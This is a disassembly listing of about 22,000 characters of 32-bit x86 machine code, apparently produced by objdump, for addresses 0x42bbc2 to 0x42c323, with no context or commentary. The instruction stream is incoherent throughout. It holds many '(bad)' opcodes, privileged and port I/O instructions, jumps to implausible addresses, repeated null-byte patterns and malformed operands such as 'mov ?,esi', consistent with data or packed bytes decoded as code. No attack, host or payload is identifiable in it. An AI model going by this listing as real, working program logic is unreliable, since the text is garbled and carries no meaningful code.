  42bbc2:	pop    ebp
  42bbc3:	pop    ecx
  42bbc4:	or     cl,BYTE PTR [ebx]
  42bbc6:	ins    DWORD PTR es:[edi],dx
  42bbc7:	shl    dh,cl
  42bbc9:	cli    
  42bbca:	jmp    0x9a3ef9c4
  42bbcf:	cs popf 
  42bbd1:	cmc    
  42bbd2:	ds push es
  42bbd4:	cmp    DWORD PTR [edi-0x63051a],0xffffffe8
  42bbdb:	jbe    0x42bc5c
  42bbdd:	inc    esp
  42bbde:	icebp  
  42bbdf:	into   
  42bbe0:	scas   eax,DWORD PTR es:[edi]
  42bbe1:	cli    
  42bbe2:	push   ds
  42bbe3:	out    0x75,al
  42bbe5:	dec    esp
  42bbe6:	loope  0x42bc31
  42bbe8:	push   edx
  42bbe9:	mov    DWORD PTR [esi+ecx*8+0x7800e5de],esp
  42bbf0:	repz cmc 
  42bbf2:	mov    ecx,DWORD PTR [ecx-0x15]
  42bbf5:	xor    eax,0xe8c967e3
  42bbfb:	inc    esp
  42bbfc:	pushf  
  42bbfd:	clc    
  42bbfe:	jmp    DWORD PTR [eax]
  42bc00:	ret    
  42bc01:	jae    0x42bc0d
  42bc03:	(bad)  
  42bc04:	(bad)  
  42bc05:	jle    0x42bc11
  42bc07:	retf   0x29f3
  42bc0a:	idiv   BYTE PTR [edi-0xd]
  42bc0d:	sub    eax,eax
  42bc0f:	add    al,0x52
  42bc11:	call   0x8825059f
  42bc16:	jne    0x42bbd4
  42bc18:	gs pop esp
  42bc1a:	hlt    
  42bc1b:	xchg   edi,ebp
  42bc1d:	outs   dx,BYTE PTR ds:[esi]
  42bc1e:	adc    DWORD PTR [esp+edx*1+0x75],edx
  42bc22:	push   es
  42bc23:	add    BYTE PTR [eax],al
  42bc25:	add    BYTE PTR [eax],al
  42bc27:	add    BYTE PTR [esi+edx*1-0x27ffeaa],bl
  42bc2e:	cmp    eax,0xbb14ffeb
  42bc33:	jg     0x42bbd2
  42bc35:	icebp  
  42bc36:	jae    0x42bc44
  42bc38:	fnstenv [edx-0x18]
  42bc3b:	call   0x42b9ad
  42bc40:	rol    cl,1
  42bc42:	outs   dx,BYTE PTR ds:[esi]
  42bc43:	inc    eax
  42bc44:	fwait
  42bc45:	push   0xfffffff0
  42bc47:	mov    edx,ecx
  42bc49:	vpcmpeqw ymm0,ymm1,ymm4
  42bc4d:	leave  
  42bc4e:	push   ebx
  42bc4f:	sti    
  42bc50:	stos   DWORD PTR es:[edi],eax
  42bc51:	lock test al,bl
  42bc54:	mov    DWORD PTR [edx-0x18],ebp
  42bc57:	call   0x3b57ae
  42bc5c:	cdq    
  42bc5d:	push   0xfffffffc
  42bc5f:	call   0x389480
  42bc64:	mov    sp,0x2ee1
  42bc68:	mov    ebp,DWORD PTR [edx+0xc]
  42bc6b:	push   eax
  42bc6c:	jne    0x42bc7a
  42bc6e:	sbb    al,cl
  42bc70:	test   BYTE PTR [ebx+0x67b584fe],bl
  42bc76:	ror    DWORD PTR [eax+esi*1+0x1bbfd713],1
  42bc7d:	out    dx,al
  42bc7e:	lock ss mov dh,0x6e
  42bc82:	jmp    0x73b1a16d
  42bc87:	call   0xf9e92a29
  42bc8c:	add    BYTE PTR [eax],al
  42bc8e:	add    BYTE PTR [eax],al
  42bc90:	add    BYTE PTR [edx-0x72038ca2],ah
  42bc96:	mov    ebx,0xe992fae6
  42bc9b:	mov    esi,0xb7202b5a
  42bca0:	mov    ebp,0x8751db6d
  42bca5:	mov    DWORD PTR [edx],ecx
  42bca7:	dec    edi
  42bca8:	dec    edi
  42bca9:	retf   
  42bcaa:	and    al,0x7b
  42bcac:	inc    esp
  42bcad:	ins    DWORD PTR es:[edi],dx
  42bcae:	sub    ebx,DWORD PTR [ebx+edx*4+0x75]
  42bcb2:	(bad)  
  42bcb4:	out    0x8b,eax
  42bcb6:	ja     0x42bca8
  42bcb8:	cli    
  42bcb9:	(bad)  
  42bcba:	push   0xffffffc6
  42bcbc:	inc    esp
  42bcbd:	dec    edx
  42bcbe:	fild   DWORD PTR [ecx+0x7bafc9f1]
  42bcc4:	dec    esp
  42bcc5:	cmp    eax,0x472f0c01
  42bcca:	jo     0x42bc8b
  42bccc:	pop    edx
  42bccd:	and    cl,BYTE PTR [ebx+eax*4-0x33]
  42bcd1:	test   al,0xff
  42bcd3:	jp     0x42bcf0
  42bcd5:	fs pusha 
  42bcd7:	out    dx,al
  42bcd8:	ss push es
  42bcda:	test   al,0x23
  42bcdc:	popaw  
  42bcde:	and    al,0x73
  42bce0:	or     al,dh
  42bce2:	xchg   ebx,eax
  42bce3:	add    dl,BYTE PTR [eax-0x6]
  42bce6:	int    0x42
  42bce8:	adc    dh,BYTE PTR ds:0xb684e902
  42bcee:	cmc    
  42bcef:	arpl   sp,ax
  42bcf1:	data16 sti 
  42bcf3:	gs leave 
  42bcf5:	add    BYTE PTR [eax],al
  42bcf7:	add    BYTE PTR [eax],al
  42bcf9:	add    BYTE PTR [edx-0x4d89f1d7],al
  42bcff:	fsubr  st,st(4)
  42bd01:	leave  
  42bd02:	xor    ebp,esp
  42bd04:	out    0x59,eax
  42bd06:	int    0x90
  42bd08:	fcomip st,st(1)
  42bd0a:	mov    edi,0x4ff0a377
  42bd0f:	inc    esp
  42bd10:	ds mov ebx,0x56e8fde8
  42bd16:	cli    
  42bd17:	aad    0x65
  42bd19:	outs   dx,BYTE PTR ds:[esi]
  42bd1a:	ins    DWORD PTR es:[edi],dx
  42bd1b:	add    dh,BYTE PTR [esi]
  42bd1d:	pop    edx
  42bd1e:	or     DWORD PTR [edi],ebp
  42bd20:	data16 outs dx,BYTE PTR ds:[esi]
  42bd22:	jns    0x42bd26
  42bd24:	xor    esp,DWORD PTR [ecx]
  42bd26:	jle    0x42bd96
  42bd28:	in     eax,0xf0
  42bd2a:	add    edx,edi
  42bd2c:	ror    ah,0x7d
  42bd2f:	in     al,0xa1
  42bd31:	jl     0x42bd8d
  42bd33:	jle    0x42bcc7
  42bd35:	jbe    0x42bdb0
  42bd37:	xor    BYTE PTR [ecx+0x237792dc],ch
  42bd3d:	add    BYTE PTR [edi+0x7503615a],ah
  42bd43:	add    dl,BYTE PTR [ecx+0x71e44b5d]
  42bd49:	pop    ecx
  42bd4a:	repz retf 0x3e80
  42bd4e:	jl     0x42bd34
  42bd50:	popa   
  42bd51:	jge    0x42bd3e
  42bd53:	xlat   BYTE PTR ds:[ebx]
  42bd54:	jmp    0x7503:0x715a755d
  42bd5b:	add    dl,BYTE PTR [esi]
  42bd5d:	les    eax,FWORD PTR [eax]
  42bd5f:	add    BYTE PTR [eax],al
  42bd61:	add    BYTE PTR [eax],al
  42bd63:	sbb    dl,BYTE PTR [ebx+0x3f]
  42bd66:	lock cmovne ebx,DWORD PTR [esi-0x53cb2]
  42bd6e:	call   0x992e3916
  42bd73:	inc    edi
  42bd74:	push   eax
  42bd75:	lea    ebp,[edx+ebx*8+0x76806833]
  42bd7c:	add    al,BYTE PTR [eax]
  42bd7e:	add    DWORD PTR [esi-0x15],esp
  42bd81:	cli    
  42bd82:	push   cs
  42bd83:	push   ecx
  42bd84:	mov    ebx,0x6423084
  42bd89:	xchg   DWORD PTR [edx+edx*8-0x5f45eca3],esp
  42bd90:	dec    ecx
  42bd91:	repz idiv eax
  42bd94:	mov    ch,0x74
  42bd96:	neg    DWORD PTR [ecx+0x6d]
  42bd99:	cld    
  42bd9a:	pop    ebx
  42bd9b:	mov    al,ds:0x19e1547c
  42bda0:	in     eax,0x85
  42bda2:	test   al,0xae
  42bda4:	sti    
  42bda5:	push   eax
  42bda6:	rcr    DWORD PTR [eax+0x46bef9fb],1
  42bdac:	ret    0xa059
  42bdaf:	mov    bh,0xff
  42bdb1:	call   DWORD PTR [edi]
  42bdb3:	mul    BYTE PTR [esi+0x24]
  42bdb6:	icebp  
  42bdb7:	jbe    0x42bdec
  42bdb9:	push   edx
  42bdba:	fnsave ss:[eax]
  42bdbd:	test   DWORD PTR [ecx-0x5698eb23],ebp
  42bdc3:	push   0x7b
  42bdc5:	neg    DWORD PTR [esi]
  42bdc7:	add    BYTE PTR [eax],al
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    BYTE PTR [edx+0x6f],bl
  42bdce:	and    al,0xe1
  42bdd0:	push   ds
  42bdd1:	and    eax,0x7c4a7709
  42bdd6:	out    dx,eax
  42bdd7:	sub    ebp,DWORD PTR fs:[esi+0x4]
  42bddb:	sbb    esi,DWORD PTR [ecx]
  42bddd:	fsub   QWORD PTR [edx]
  42bddf:	mov    bh,0xbe
  42bde1:	mov    edi,edi
  42bde3:	call   0x4205395e
  42bde8:	daa    
  42bde9:	jmp    0xd882:0x4cb300fa
  42bdf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bdf1:	test   eax,0x6843fe02
  42bdf6:	mov    edx,0x48d2eb
  42bdfb:	push   0xfffffdf5
  42be00:	mov    edi,0x85b8e2be
  42be05:	shl    ebp,cl
  42be07:	pop    edi
  42be08:	and    bh,BYTE PTR [eax]
  42be0a:	pop    ecx
  42be0b:	ret    0xfed8
  42be0e:	push   esp
  42be0f:	mov    esi,DWORD PTR [eax+0x4d]
  42be12:	dec    esi
  42be13:	push   edi
  42be14:	push   ecx
  42be15:	cmp    esp,edi
  42be17:	push   eax
  42be18:	hlt    
  42be19:	js     0x42be15
  42be1b:	call   FWORD PTR [esi+eax*8-0x2c3c0533]
  42be22:	xor    eax,0x206eed09
  42be28:	pop    ss
  42be29:	cmp    bh,ah
  42be2b:	mov    ecx,0xfffffdd7
  42be30:	add    BYTE PTR [eax],al
  42be32:	add    BYTE PTR [eax],al
  42be34:	add    BYTE PTR [edi-0x30],bh
  42be37:	cmp    ecx,0xd283ebbb
  42be3d:	test   eax,0x104d37e0
  42be42:	push   esp
  42be43:	or     DWORD PTR [ebx+0x187de91],ecx
  42be49:	xlat   BYTE PTR ds:[ebx]
  42be4a:	(bad)  
  42be4b:	loope  0x42be55
  42be4d:	mov    bh,BYTE PTR [esi-0xf0df7aa]
  42be53:	sub    eax,eax
  42be55:	arpl   WORD PTR [eax-0x37],dx
  42be58:	ret    0x648
  42be5b:	push   ecx
  42be5c:	and    DWORD PTR [eax],0x2a
  42be5f:	or     BYTE PTR [eax],al
  42be61:	out    dx,eax
  42be62:	aaa    
  42be63:	dec    edi
  42be64:	je     0x42bebb
  42be66:	mov    edi,DWORD PTR [edx+0x5cfe7574]
  42be6c:	shr    BYTE PTR [esi],0xeb
  42be6f:	(bad)  
  42be70:	(bad)  
  42be71:	inc    BYTE PTR [ebx+0x52]
  42be74:	sti    
  42be75:	mov    DWORD PTR [edi],eax
  42be77:	or     al,0xe8
  42be79:	aam    0xe3
  42be7b:	in     al,dx
  42be7c:	cli    
  42be7d:	(bad)  
  42be7e:	sbb    ecx,DWORD PTR [eax+0x30ef60f1]
  42be84:	ror    dh,0xc8
  42be87:	push   esp
  42be88:	push   0xfffeebff
  42be8d:	(bad)  
  42be8e:	sub    bh,dl
  42be90:	xor    ah,cl
  42be92:	or     dl,ch
  42be94:	push   ecx
  42be95:	out    dx,eax
  42be96:	and    edx,edi
  42be98:	adc    eax,DWORD PTR [eax]
  42be9a:	add    BYTE PTR [eax],al
  42be9c:	add    BYTE PTR [eax],al
  42be9e:	ins    DWORD PTR es:[edi],dx
  42be9f:	fldlg2 
  42bea1:	test   DWORD PTR [esi+0x7565fd04],esi
  42bea7:	xor    eax,DWORD PTR [esi+0x2feba2ff]
  42bead:	ror    BYTE PTR [ebp-0x6d051a20],0x30
  42beb4:	dec    edx
  42beb5:	push   edi
  42beb6:	sub    al,0xad
  42beb8:	pop    es
  42beb9:	add    BYTE PTR [eax],ch
  42bebb:	push   esp
  42bebc:	loopne 0x42bf0e
  42bebe:	and    al,0x1
  42bec0:	jnp    0x42bf06
  42bec2:	jno    0x42bebf
  42bec4:	pop    ebx
  42bec5:	xchg   edx,eax
  42bec6:	jne    0x42beb3
  42bec8:	(bad)  
  42bec9:	out    0xab,eax
  42becb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42becc:	in     al,dx
  42becd:	cli    
  42bece:	out    dx,al
  42becf:	mov    ds:0xefc9c882,al
  42bed4:	ja     0x42bf1a
  42bed6:	dec    ecx
  42bed7:	cmc    
  42bed8:	sub    ebp,DWORD PTR [edi]
  42beda:	daa    
  42bedb:	add    ebp,esi
  42bedd:	icebp  
  42bede:	lock jl 0x42bf53
  42bee1:	or     ch,BYTE PTR [esi+edx*8-0x16]
  42bee5:	ins    DWORD PTR es:[edi],dx
  42bee6:	jl     0x42beea
  42bee8:	outs   dx,BYTE PTR ds:[esi]
  42bee9:	push   edi
  42beea:	ins    DWORD PTR es:[edi],dx
  42beeb:	mov    esp,esi
  42beed:	js     0x42bf24
  42beef:	in     eax,dx
  42bef0:	loopne 0x42bf44
  42bef2:	sbb    eax,0xfede1a1
  42bef7:	adc    eax,0xc42c4e29
  42befc:	in     al,0x3
  42befe:	mov    al,ds:0x53448d
  42bf03:	add    BYTE PTR [eax],al
  42bf05:	add    BYTE PTR [eax],al
  42bf07:	inc    esp
  42bf08:	cmp    BYTE PTR [edi+eax*2-0x17],bl
  42bf0c:	xor    DWORD PTR [edi+0x1fd7cd67],ecx
  42bf12:	in     eax,dx
  42bf13:	fisttp WORD PTR [eax+eiz*1-0x12aa4279]
  42bf1a:	js     0x42bf4d
  42bf1c:	fimul  WORD PTR [esi-0x654b6dd7]
  42bf22:	hlt    
  42bf23:	les    eax,FWORD PTR [esi+0x1b7f7716]
  42bf29:	je     0x42bf1a
  42bf2b:	sbb    BYTE PTR [ebx],cl
  42bf2d:	outs   dx,BYTE PTR ds:[esi]
  42bf2e:	push   esi
  42bf2f:	ins    DWORD PTR es:[edi],dx
  42bf30:	mov    esp,esi
  42bf32:	js     0x42bee9
  42bf34:	in     al,dx
  42bf35:	loopne 0x42bf89
  42bf37:	popf   
  42bf38:	pusha  
  42bf39:	loop   0x42bf28
  42bf3b:	(bad)  
  42bf3c:	adc    al,0xa9
  42bf3e:	dec    ebp
  42bf3f:	lods   al,BYTE PTR ds:[esi]
  42bf40:	ret    
  42bf41:	in     al,0x3
  42bf43:	and    BYTE PTR [ebp-0x24a97f3c],cl
  42bf49:	pop    ss
  42bf4a:	sub    ecx,0xc750e90a
  42bf50:	aaa    
  42bf51:	adc    eax,0x1cc2f032
  42bf56:	push   ds
  42bf57:	fcmovb st,st(2)
  42bf59:	into   
  42bf5a:	js     0x42bf9e
  42bf5c:	cmp    BYTE PTR [edx-0x5b15928a],al
  42bf62:	add    al,0x3f
  42bf64:	loopne 0x42bf65
  42bf66:	popa   
  42bf67:	es xchg ecx,esi
  42bf6a:	hlt    
  42bf6b:	add    BYTE PTR [eax],al
  42bf6d:	add    BYTE PTR [eax],al
  42bf6f:	add    BYTE PTR [edx+0x30],dh
  42bf72:	rcl    BYTE PTR [edx+0x57],0x34
  42bf76:	lds    bx,DWORD PTR [ebp+0x1ebee7c4]
  42bf7d:	(bad)  
  42bf7f:	mov    bh,0x8c
  42bf81:	mov    bh,0xe7
  42bf83:	add    edi,DWORD PTR [eax-0x24]
  42bf86:	cli    
  42bf87:	jae    0x42bfbe
  42bf89:	jmp    0x68b98294
  42bf8e:	fs cli 
  42bf90:	mov    dh,0xe7
  42bf92:	aas    
  42bf93:	and    ecx,edx
  42bf95:	fcomp  QWORD PTR [edx-0x41]
  42bf98:	sub    eax,0xb4b4e487
  42bf9d:	add    eax,DWORD PTR [eax]
  42bf9f:	fisub  DWORD PTR [edx+ebx*1+0x567acd54]
  42bfa6:	pop    ds
  42bfa7:	jb     0x42bfe0
  42bfa9:	or     dh,BYTE PTR [edi]
  42bfab:	sub    ebp,DWORD PTR [edx]
  42bfad:	(bad)  
  42bfae:	and    BYTE PTR cs:[esi-0xe],bl
  42bfb2:	je     0x42bfa9
  42bfb4:	dec    esi
  42bfb5:	xor    al,BYTE PTR [ecx]
  42bfb7:	push   ebp
  42bfb8:	fwait
  42bfb9:	inc    edx
  42bfba:	aaa    
  42bfbb:	and    eax,0xe6740655
  42bfc0:	ss out 0xec,eax
  42bfc3:	cli    
  42bfc4:	mov    dh,0xe8
  42bfc6:	add    DWORD PTR [ecx],ebp
  42bfc8:	call   0x39d:0x712885e0
  42bfcf:	jmp    0x1d42dbca
  42bfd4:	add    BYTE PTR [eax],al
  42bfd6:	add    BYTE PTR [eax],al
  42bfd8:	add    BYTE PTR [esi+0x30],dh
  42bfdb:	rcl    BYTE PTR [eax-0x16052026],0xab
  42bfe2:	(bad)  [ebx-0x3b]
  42bfe5:	dec    esi
  42bfe6:	fcom   QWORD PTR [eax+eax*1]
  42bfe9:	call   0xc742ffe5
  42bfee:	into   
  42bfef:	sbb    ebx,0x2b
  42bff2:	fild   QWORD PTR [eax+eax*8]
  42bff5:	not    DWORD PTR [eax+0x4e]
  42bff8:	lea    eax,[ebx-0x25]
  42bffb:	jns    0x42c03b
  42bffd:	or     al,0x52
  42bfff:	sbb    ecx,DWORD PTR [ebp-0x17affb21]
  42c005:	call   0x8504:0x85fff604
  42c00c:	rol    al,0xfe
  42c00f:	dec    edx
  42c010:	push   DWORD PTR [eax]
  42c012:	dec    DWORD PTR [edi]
  42c014:	push   eax
  42c015:	fwait
  42c016:	icebp  
  42c017:	cmp    edx,DWORD PTR [esi]
  42c019:	or     al,0x3
  42c01b:	jnp    0x42bfe1
  42c01d:	enter  0x565d,0x4
  42c021:	ja     0x42c01f
  42c023:	add    BYTE PTR [edi-0x30],0x59
  42c027:	inc    edi
  42c028:	sbb    ch,cl
  42c02a:	mov    edx,0xebba05d0
  42c02f:	jle    0x42bff1
  42c031:	xor    edi,ebx
  42c033:	sub    al,0xc0
  42c035:	ja     0x42c049
  42c037:	or     DWORD PTR [esi],0xffffff9b
  42c03a:	sbb    eax,DWORD PTR [ebx+eax*1]
  42c03d:	add    BYTE PTR [eax],al
  42c03f:	add    BYTE PTR [eax],al
  42c041:	add    BYTE PTR [ebx+0x2],cl
  42c044:	dec    ebx
  42c045:	push   DWORD PTR [eax]
  42c047:	and    dl,BYTE PTR [eax]
  42c049:	push   ecx
  42c04a:	mov    ebx,0x4c163bf1
  42c04f:	push   es
  42c050:	jnp    0x42c016
  42c052:	mov    BYTE PTR ds:0x40d70457,al
  42c058:	add    al,0x8b
  42c05a:	dec    edx
  42c05b:	(bad)  
  42c05c:	inc    BYTE PTR [edi]
  42c05e:	dec    esp
  42c05f:	jmp    0x4129c4a1
  42c064:	add    al,0x8b
  42c066:	jne    0x42c04d
  42c068:	rol    BYTE PTR [ebx],0x7d
  42c06b:	jmp    0x42c052
  42c06d:	inc    edx
  42c06e:	jns    0x42c08b
  42c070:	add    al,0x5a
  42c072:	sahf   
  42c073:	test   eax,0x60c9fffa
  42c078:	sar    DWORD PTR [edi+0x6a],cl
  42c07b:	jmp    0x42c0e7
  42c07d:	add    al,0x67
  42c07f:	sub    ebx,edx
  42c081:	pusha  
  42c082:	ret    
  42c083:	cmp    al,0x70
  42c085:	or     dh,bh
  42c087:	and    al,0xd7
  42c089:	sbb    DWORD PTR [edx],ecx
  42c08b:	dec    ebp
  42c08c:	out    0x86,al
  42c08e:	add    eax,0xf0087053
  42c093:	adc    eax,0x2ba70470
  42c098:	fiadd  DWORD PTR [edi+0x46]
  42c09b:	jne    0x42c082
  42c09d:	adc    al,0xd1
  42c09f:	fnstcw WORD PTR [esi]
  42c0a1:	add    dh,ch
  42c0a3:	lods   al,BYTE PTR ds:[esi]
  42c0a4:	cli    
  42c0a5:	mov    WORD PTR [eax],es
  42c0a7:	add    BYTE PTR [eax],al
  42c0a9:	add    BYTE PTR [eax],al
  42c0ab:	sub    eax,0x860377ea
  42c0b0:	shl    BYTE PTR [esi+0x1d34a8c],0xa
  42c0b7:	and    al,0x7b
  42c0b9:	in     eax,0x74
  42c0bb:	jge    0x42c091
  42c0bd:	or     bh,BYTE PTR [ebx+eax*4]
  42c0c0:	stos   DWORD PTR es:[edi],eax
  42c0c1:	(bad)  
  42c0c2:	sub    BYTE PTR [edx-0x11],al
  42c0c5:	jnp    0x42c111
  42c0c7:	jno    0x42c131
  42c0c9:	ror    BYTE PTR [ebx],0x2e
  42c0cc:	push   0xbc0000e7
  42c0d1:	out    0x31,eax
  42c0d3:	(bad)  
  42c0d4:	sar    edx,0xf9
  42c0d7:	jp     0x42c141
  42c0d9:	push   ds
  42c0da:	add    BYTE PTR [edx+0x24],dh
  42c0dd:	add    bh,ah
  42c0df:	jo     0x42c0a4
  42c0e1:	sbb    al,0x5
  42c0e3:	arpl   WORD PTR [edx],ax
  42c0e5:	mov    ds:0x3c3c75b4,al
  42c0ea:	(bad)  
  42c0eb:	jbe    0x42c0ef
  42c0ed:	cmp    al,0x7d
  42c0ef:	pop    esi
  42c0f0:	cmp    DWORD PTR [esp+ebx*4+0x42],0xffffffdd
  42c0f5:	call   0x7a517a7e
  42c0fa:	stc    
  42c0fb:	idiv   BYTE PTR [esi-0x18]
  42c0fe:	add    esi,DWORD PTR [ebp-0x2c]
  42c101:	and    edx,DWORD PTR [eax]
  42c103:	and    ecx,DWORD PTR [esi-0x70551855]
  42c109:	arpl   WORD PTR [esi+ecx*1-0x23],cx
  42c10d:	push   ecx
  42c10e:	push   esp
  42c10f:	add    BYTE PTR [eax],al
  42c111:	add    BYTE PTR [eax],al
  42c113:	add    BYTE PTR [esi],cl
  42c115:	push   edi
  42c116:	ffree  st(0)
  42c118:	mov    ecx,0x750468de
  42c11d:	add    dh,BYTE PTR [ebp+0x30f6ee15]
  42c123:	sysexit 
  42c125:	add    ah,BYTE PTR [esp+eax*8+0x66]
  42c129:	repnz gs mov esp,0x436eadf
  42c130:	jne    0x42c134
  42c132:	adc    cl,BYTE PTR [edi]
  42c134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c135:	imul   BYTE PTR [eax-0x751225fd]
  42c13b:	test   cl,bh
  42c13d:	cmp    edx,edi
  42c13f:	call   0x1dbec0f3
  42c144:	adc    eax,DWORD PTR [esi]
  42c146:	pop    esp
  42c147:	jg     0x42c187
  42c149:	fucom  st(1)
  42c14b:	call   0xe466507a
  42c150:	inc    edx
  42c151:	les    ebp,FWORD PTR [ebx]
  42c153:	stc    
  42c154:	jne    0x42c140
  42c156:	mov    ?,esi
  42c158:	jl     0x42c136
  42c15a:	dec    esi
  42c15b:	push   es
  42c15c:	call   0x702bdfe7
  42c161:	fdiv   st(7),st
  42c163:	sbb    dl,ah
  42c165:	inc    esi
  42c166:	in     al,0x19
  42c168:	inc    ecx
  42c169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c16a:	add    al,0xa7
  42c16c:	dec    ebp
  42c16d:	in     eax,0x51
  42c16f:	pop    es
  42c170:	clc    
  42c171:	sahf   
  42c172:	push   edi
  42c173:	xchg   esi,eax
  42c174:	pop    ebp
  42c175:	fst    DWORD PTR [edx]
  42c177:	adc    al,0x0
  42c179:	add    BYTE PTR [eax],al
  42c17b:	add    BYTE PTR [eax],al
  42c17d:	or     esp,DWORD PTR [esi+0x10]
  42c180:	je     0x42c13d
  42c182:	cmp    edi,ebx
  42c184:	jle    0x42c1a3
  42c186:	dec    esp
  42c187:	lea    ebp,[ecx+edx*1]
  42c18a:	dec    esp
  42c18b:	ret    0x1c24
  42c18e:	add    al,ch
  42c190:	outs   dx,DWORD PTR ds:[esi]
  42c191:	sbb    ebx,edx
  42c193:	cli    
  42c194:	sar    DWORD PTR [eax-0x73],cl
  42c197:	test   BYTE PTR [ebx-0x460526e3],dh
  42c19d:	mov    eax,DWORD PTR [esi-0x10]
  42c1a0:	cdq    
  42c1a1:	push   ds
  42c1a2:	push   eax
  42c1a3:	add    eax,0x14e4dd3f
  42c1a8:	ret    
  42c1a9:	jb     0x42c138
  42c1ab:	inc    esp
  42c1ac:	dec    ecx
  42c1ad:	inc    esi
  42c1ae:	jmp    0xa4f1:0xd8ccef1f
  42c1b5:	add    BYTE PTR [ecx],0x74
  42c1b8:	in     al,0xb4
  42c1ba:	inc    esi
  42c1bb:	or     esp,ebp
  42c1bd:	mov    ch,0x46
  42c1bf:	cld    
  42c1c0:	(bad)  [esi+0x2]
  42c1c3:	add    BYTE PTR [edx],dl
  42c1c5:	mov    cl,0xc1
  42c1c7:	inc    esp
  42c1c8:	out    0x77,al
  42c1ca:	mov    edi,0x275ed44
  42c1cf:	add    cl,ch
  42c1d1:	sbb    al,0x46
  42c1d3:	adc    BYTE PTR [ecx+0x34],dh
  42c1d6:	or     eax,0x460ded66
  42c1db:	or     al,0x39
  42c1dd:	cld    
  42c1de:	inc    ebp
  42c1df:	fadd   QWORD PTR [eax]
  42c1e1:	add    BYTE PTR [eax],al
  42c1e3:	add    BYTE PTR [eax],al
  42c1e5:	add    BYTE PTR [esp+ebx*4+0x43],bl
  42c1e9:	or     al,0x59
  42c1eb:	popf   
  42c1ec:	inc    ebx
  42c1ed:	push   cs
  42c1ee:	pop    esp
  42c1ef:	mov    bh,0x26
  42c1f1:	add    eax,0x4581e312
  42c1f6:	adc    BYTE PTR [edi-0x46],bh
  42c1f9:	add    al,0x8c
  42c1fb:	pop    ecx
  42c1fc:	inc    esp
  42c1fd:	fmul   QWORD PTR [ebx+eiz*8-0x260bf78d]
  42c204:	dec    edi
  42c205:	push   ebx
  42c207:	push   cs
  42c208:	leave  
  42c209:	test   ah,bl
  42c20b:	rcl    BYTE PTR [ebx-0x383a683f],cl
  42c211:	ret    0xff3c
  42c214:	push   esp
  42c215:	mov    eax,eax
  42c217:	test   esi,esp
  42c219:	lock sbb bh,bh
  42c21c:	call   DWORD PTR [edx-0x36]
  42c21f:	push   edi
  42c220:	je     0x42c22a
  42c222:	retf   
  42c223:	dec    esp
  42c224:	call   0xf627d578
  42c229:	xor    esp,DWORD PTR [ebp+0x480efa2a]
  42c22f:	lds    ebp,FWORD PTR [ecx]
  42c231:	(bad)  
  42c233:	cmp    BYTE PTR [ecx],al
  42c235:	lea    ecx,[ecx]
  42c237:	call   0x5db54d86
  42c23c:	dec    esp
  42c23d:	loopne 0x42c2b3
  42c23f:	lock dec edi
  42c241:	push   DWORD PTR [ebx-0x7e]
  42c244:	mov    edx,0xfa40480f
  42c249:	inc    DWORD PTR [eax]
  42c24b:	add    BYTE PTR [eax],al
  42c24d:	add    BYTE PTR [eax],al
  42c24f:	pushf  
  42c250:	es pop ebp
  42c252:	sti    
  42c253:	xchg   ebx,eax
  42c254:	pop    edx
  42c255:	cmp    BYTE PTR [edx],al
  42c257:	mov    esi,?
  42c259:	push   es
  42c25a:	mov    dh,0x49
  42c25c:	out    0x49,eax
  42c25e:	push   eax
  42c25f:	and    DWORD PTR [edx-0x4b8a0372],eax
  42c265:	loope  0x42c2b6
  42c267:	lea    ebx,[ebx+0x6c7afb31]
  42c26d:	mov    edi,0xb8f90a
  42c272:	add    BYTE PTR [ebp-0x20],dh
  42c275:	lods   al,BYTE PTR ds:[esi]
  42c276:	inc    esp
  42c277:	pop    esi
  42c278:	(bad)  
  42c27b:	popf   
  42c27c:	jg     0x42c27d
  42c27e:	xchg   ebx,eax
  42c27f:	push   ecx
  42c280:	jns    0x42c263
  42c282:	jae    0x42c20c
  42c284:	mov    ah,0xbd
  42c286:	je     0x42c2cf
  42c288:	mov    ebp,0xe51df2be
  42c28d:	mov    esi,0xe1ea7524
  42c292:	cli    
  42c293:	jmp    0xb9ed:0x22ffe1e6
  42c29a:	or     ah,dl
  42c29c:	sub    edi,DWORD PTR [esp+eax*2+0x19]
  42c2a0:	mov    dh,0x0
  42c2a2:	lea    esi,[eax+0xd524f47]
  42c2a8:	xchg   edi,eax
  42c2a9:	dec    esi
  42c2aa:	sti    
  42c2ab:	cli    
  42c2ac:	addr16 mov edi,0x3f8f90a
  42c2b2:	add    BYTE PTR [eax],al
  42c2b4:	add    BYTE PTR [eax],al
  42c2b6:	add    BYTE PTR [eax],al
  42c2b8:	jne    0x42c283
  42c2ba:	sub    edi,DWORD PTR [ebp-0x27]
  42c2bd:	mov    cs,WORD PTR [esi]
  42c2bf:	mov    al,0x74
  42c2c1:	repnz retf 0x7500
  42c2c5:	jmp    0x42c33e
  42c2c7:	xor    DWORD PTR [eax+0x57],0xffffffe3
  42c2cb:	cli    
  42c2cc:	ret    0xbf04
  42c2cf:	dec    esi
  42c2d0:	dec    edi
  42c2d1:	out    0x77,eax
  42c2d3:	inc    esp
  42c2d4:	mov    ecx,0xfdf9757b
  42c2d9:	outs   dx,BYTE PTR ds:[esi]
  42c2da:	jmp    0xe1bbb8c6
  42c2df:	cli    
  42c2e0:	icebp  
  42c2e1:	add    ch,BYTE PTR [ecx-0x186d090b]
  42c2e7:	add    esi,DWORD PTR [ebp-0x7e]
  42c2ea:	push   ebx
  42c2eb:	sar    BYTE PTR [ecx+0x9],0x64
  42c2ef:	sahf   
  42c2f0:	jne    0x42c2f4
  42c2f2:	jmp    0xe8257ce4
  42c2f7:	outs   dx,DWORD PTR ds:[esi]
  42c2f8:	test   ecx,eax
  42c2fa:	sub    ebp,DWORD PTR [edi+eax*4+0x3603e902]
  42c301:	aas    
  42c302:	add    dh,BYTE PTR gs:[ebp+0x2]
  42c306:	jmp    0x2c043fe3
  42c30b:	lods   al,BYTE PTR ds:[esi]
  42c30c:	inc    eax
  42c30d:	fld1   
  42c30f:	add    esi,DWORD PTR [esi]
  42c311:	aas    
  42c312:	inc    ebp
  42c313:	or     eax,0xf4e90275
  42c318:	in     al,0x3e
  42c31a:	stos   BYTE PTR es:[edi],al
  42c31b:	cmp    al,0x0
  42c31d:	add    BYTE PTR [eax],al
  42c31f:	add    BYTE PTR [eax],al
  42c321:	cli    
  42c322:	push   cs
  42c323:	xchg   ebp,eax
